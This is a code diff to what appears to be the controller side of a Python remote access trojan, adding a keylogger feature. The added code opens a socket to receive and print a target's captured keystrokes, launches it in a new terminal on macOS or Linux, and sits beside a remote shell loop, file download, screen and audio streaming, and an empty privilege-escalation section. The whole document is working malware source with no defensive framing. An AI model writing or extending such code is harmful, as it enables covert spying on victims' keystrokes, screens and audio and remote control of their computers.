@@ -10,6 +10,10 @@ import queue
 import multiprocessing
 from dotenv import load_dotenv
 
+# ====================
+# Environment
+# ====================
+
 # Load environment variables from .env file
 dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
 load_dotenv(dotenv_path)
@@ -19,12 +23,18 @@ TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
 TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
 VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
 AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))
+KEYLOGGER_PORT = int(os.getenv("KEYLOGGER_PORT", 7000))
 
 # Use these variables in your code
 print(f"Target IP: {TARGET_IP}")
 print(f"Target Port: {TARGET_PORT}")
 print(f"Video Port: {VIDEO_PORT}")
 print(f"Audio Port: {AUDIO_PORT}")
+print(f"Keylogger Port: {KEYLOGGER_PORT}")
+
+# ====================
+# Utils Function
+# ====================
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(socket, data):
@@ -79,10 +89,14 @@ def download_file(socket, file_name):
         # Reset the timeout to its default value (None).
         socket.settimeout(None)
 
-
+# ====================
+# Shell Command
+# ====================
+keylogger_process = None 
 # Function for the main communication loop with the target
 def target_communication(target):
     dir = ''
+    keylogger_socket, keylogger_thread = None, None
     while True:
         command = input(f'* Shell~{str(TARGET_IP)}: {dir}$ ')
         reliable_send(target, command)
@@ -90,6 +104,14 @@ def target_communication(target):
         # Common command
         if command == 'quit':
             stop_screen_stream()
+            # Terminate the main program and keylogger process
+            print("Terminating keylogger and main program...")
+            if keylogger_socket:
+                reliable_send(keylogger_socket, "TERMINATE")
+                keylogger_socket.close()
+            if keylogger_thread:
+                keylogger_thread.join(timeout=1)
+            terminate_keylogger_terminal()
             break
         elif command == 'clear':
             os.system('clear')
@@ -122,7 +144,31 @@ def target_communication(target):
         
         # Keylogger
         elif command == 'keylogger':
-            print('''
+            print('Keylogger Initiated')
+            keylogger_terminal()
+        
+        # Others
+        else:
+            result = reliable_recv(target)
+            print(result)
+
+# ====================
+# Feature 1: Keylogger
+# ====================
+
+# Keylogger receiver function
+
+def keylogger_receiver():
+    keylogger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    keylogger_socket.bind((TARGET_IP, KEYLOGGER_PORT))
+    keylogger_socket.listen(1)
+    print(f"Keylogger server listening on {TARGET_IP}:{KEYLOGGER_PORT}")
+
+    try:
+        keylogger_client, addr = keylogger_socket.accept()
+        print(f"Keylogger client connected from {addr}")
+        
+        print('''
   _  __            _  _     _              __ _    __ _                  
  | |/ /    ___    | || |   | |     ___    / _` |  / _` |   ___      _ _  
  | ' <    / -_)    \_, |   | |    / _ \   \__, |  \__, |  / -_)    | '_| 
@@ -131,10 +177,71 @@ _|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
 ''')
         
-        # Others
+        while True:
+            keystroke = reliable_recv(keylogger_client)  # Implement reliable_recv function as per your implementation
+            print(keystroke)
+            if keystroke == "esc":
+                break
+    
+    except Exception as e:
+        print(f"Error in keylogger receiver: {e}")
+    
+    finally:
+        keylogger_socket.close()
+
+import sys
+import subprocess
+import signal
+
+# Function to get the virtual environment path
+def get_virtualenv_path():
+    # Check if we are in a virtual environment
+    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
+        # Python is running in a virtual environment
+        if sys.platform == 'win32':
+            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
         else:
-            result = reliable_recv(target)
-            print(result)
+            return os.path.join(sys.prefix, 'bin', 'activate')
+
+    # If not in a virtual environment, return None
+    return None
+
+# Function to handle keylogger terminal
+def keylogger_terminal():
+    global keylogger_process  # Access the global variable
+    current_dir = os.path.abspath('.')
+    virtualenv_activate = get_virtualenv_path()
+
+    if virtualenv_activate:
+        if os.name == 'posix':
+            if 'darwin' in os.uname().sysname.lower():  # macOS
+                osascript_command = f'tell application "iTerm"\n' \
+                                    f'  create window with default profile\n' \
+                                    f'  tell current session of current window to write text "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\""\n' \
+                                    f'end tell'
+                keylogger_process = subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            else:  # Linux (example with gnome-terminal)
+                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 -c \\"import server; server.keylogger_receiver()\\"; exec bash"'
+                keylogger_process = subprocess.Popen(terminal_command, shell=True)
+    else:
+        print("Virtual environment not found.")
+
+def terminate_keylogger_terminal():
+    global keylogger_process
+    if keylogger_process:
+        if 'darwin' in os.uname().sysname.lower():  # macOS
+            os.killpg(os.getpgid(keylogger_process.pid), signal.SIGTERM)
+        else:  # Linux
+            keylogger_process.terminate()
+        keylogger_process = None
+
+# ====================
+# Feature 2: Privilege Escalation
+# ====================
+
+# ====================
+# Feature 3: Screen Streaming
+# ====================
 
 # Constants
 CHUNK = 1024
@@ -252,7 +359,6 @@ def screen_streamer(connected, commu_queue):
     video_thread.join()
     audio_thread.join()
 
-
 # Function to start screen streaming in a separate process
 def start_screen_stream(connected):
     global screen_process
@@ -283,6 +389,10 @@ def stop_screen_stream():
             print("Screen streaming process terminated.")
     except NameError:
         print("Screen streaming process not running.")  
+
+# ====================
+# Main Program
+# ====================
 
 def main():
     # Create a socket for the server
